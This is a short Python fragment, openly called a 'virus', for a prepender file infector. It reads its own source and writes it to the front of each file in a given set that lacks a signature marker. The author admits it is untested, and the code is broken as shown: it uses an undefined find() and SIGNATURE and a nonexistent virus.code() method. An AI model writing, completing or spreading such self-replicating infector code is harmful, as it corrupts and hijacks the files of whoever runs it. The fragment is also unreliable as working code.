import glob
import os


# Did not test the code

def prepender(file_set):
	for filename in file_set:
		virus_string=''
		virus=open(__file__,'r')
		for line in virus.code():
			virus_string=virus_string+line
		host=open(filename,'r')
		hostcode=host.read()
		host_string=''
		if find(hostcode,SIGNATURE)==-1:
			for line in hostcode:
				host_string=host_string+line
			data=virus_string+chr(13)+host_string
			host=open(filename,'w')
			host.write(data)
			host.close()
